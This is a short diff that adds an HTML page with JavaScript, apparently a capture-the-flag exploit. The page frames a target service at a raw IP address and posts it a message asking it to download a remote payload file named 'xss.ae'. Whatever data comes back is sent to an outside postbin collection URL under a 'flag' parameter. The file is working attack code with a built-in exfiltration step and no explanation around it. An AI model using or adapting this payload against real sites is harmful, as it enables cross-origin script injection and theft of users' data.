@@ -1,0 +1,18 @@
+<iframe id="iframe" src="http://206.189.113.19:32339/engine"></iframe>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+window.onmessage = (e) => {
+  let {
+        data,
+        origin,
+        source
+    } = e;
+    document.location="https://www.toptal.com/developers/postbin/1661892845090-2004152068402?flag=" + data;
+}
+            
+document.getElementById("iframe").contentWindow.postMessage({
+            type: "download",
+            url: "https://raw.githubusercontent.com/B00TK1D/xss/main/xss.ae"
+        }, location.origin);
+</script>
+Footer
